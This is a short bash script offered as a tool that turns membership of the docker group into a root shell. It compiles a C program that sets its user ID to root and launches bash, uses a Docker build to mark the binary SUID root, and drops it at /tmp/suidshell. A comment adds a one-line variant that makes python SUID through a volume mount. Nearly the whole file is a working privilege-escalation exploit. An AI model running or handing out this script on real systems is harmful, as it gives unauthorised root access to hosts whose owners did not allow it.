#!/bin/bash
# Description
# This tool creates a SUID root shell at /tmp/suidshell if user is in docker group 

# Todo:
# * Create b64 encoded (static) bin to not depend on gcc (for osx & linux)
# * Add error checks
# * 

# Alternative without gcc and downloading stuff (except ubuntu image):
# sudo docker run -it -v /usr/bin/python:/python chmod u+s /python

cfile='#include<unistd.h>\nint main() { setresuid(0,0,0); system("/bin/bash"); }'
dfile='FROM ubuntu\nCOPY ./shell /shell\nRUN chown root:root /shell\nRUN chmod u+s /shell'

dir=$(mktemp -d)
cd $dir
echo -e $cfile > $dir/shell.c
echo -e $dfile > $dir/Dockerfile
gcc $dir/shell.c -o $dir/shell
#pwd;ls
docker build -t mybntu . >/dev/null
cid=$(docker run -d --rm mybntu sleep 2000 | cut -c 1-8)
docker cp $cid:/shell /tmp/suidshell
echo 'Suid root shell @ /tmp/suidshell'

echo 'Cleanup...'
cd .. ; rm -rf $dir
docker kill $cid
sleep 10
docker rm $cid
